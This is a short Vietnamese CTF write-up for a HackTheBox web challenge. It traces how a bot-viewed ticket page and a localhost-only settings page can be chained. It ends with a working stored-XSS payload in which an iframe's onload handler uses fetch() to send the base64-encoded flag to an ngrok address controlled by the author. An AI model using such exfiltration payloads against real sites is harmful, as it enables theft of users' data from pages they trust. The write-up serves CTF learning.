![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/Untitled.png)
ta tiến hành đọc code và thấy rằng ở tệp __challenge/views/settings.html__ có flag nằm ở thẻ input
![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/4.png)
<br />
tệp challenge/routes/index.js có đoạn code mô tả
chỉ cần truy cập vào đường dẫn __/settings__ thì sẽ nhận response là __settings.html__ nhưng mà đường dẫn này chỉ có ip localhost mới được truy cập.
![](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/1.png)

ở đoạn mã này có mô tả, ta chỉ cần gửi 1 gói __json gồm có name, email, website, message__ thì sẽ lưu vào database
![](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/3.png)
và sau đó con bot sẽ tiến hành truy cập đến đường dẫn __/tickets__
![](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/%60.png)

khi vào đường dẫn __/tickets__  này, sẽ hiện thị ra toàn bộ dữ liệu trong table __tickets__ 
![](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/2.png)

bây giờ ta chỉ cần chèn mã script vào bất kỳ trường __name, email, website, message__ trong gói json gửi lên __/api/submit_ticket__   để thực hiện XSS gửi flag về máy mình
``` <iframe id="iframetrung" src="settings" onload=fetch("http://027d-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/?flag="+btoa(document.getElementById('iframetrung').contentWindow.document.getElementsByTagName("input")[4].value)); >
</iframe>
```
và dùng công cụ ngrok để nhận flag gửi về
